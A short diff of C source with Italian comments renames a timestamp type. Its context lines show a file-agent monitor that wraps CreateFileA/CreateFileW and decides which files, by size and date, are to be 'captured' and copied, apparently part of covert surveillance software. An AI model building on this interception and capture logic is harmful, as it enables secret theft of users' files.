@@ -43,10 +43,10 @@ typedef struct {
 BOOL bPM_FileAgentStarted = FALSE; // Flag che indica se il monitor e' attivo o meno
 DWORD min_fsize = 0, max_fsize = 0; // Dimensione minima e massima di un file che puo' essere catturato 
 BOOL log_file_open = TRUE;
-nanosec_time min_date; // Data minima di un file che puo' essere catturato
+NANOSEC_TIME min_date; // Data minima di un file che puo' essere catturato
 
 // Dichiarato in SM_EventHandlers.h
-extern BOOL IsGreaterDate(nanosec_time *, nanosec_time *);
+extern BOOL IsGreaterDate(NANOSEC_TIME *, NANOSEC_TIME *);
 
 
 // -- Wrapper CreateFileA e CreateFileW
@@ -327,7 +327,7 @@ BOOL IsToCopy(WCHAR *file_name, BOOL *exceed_size)
 {
 	HANDLE hfile;
 	BY_HANDLE_FILE_INFORMATION file_info;
-	nanosec_time file_date;
+	NANOSEC_TIME file_date;
 
 	// XXX Controlla se e' su un disco rimovibile 
 	//if (IsFixedDrive(file_name)) 
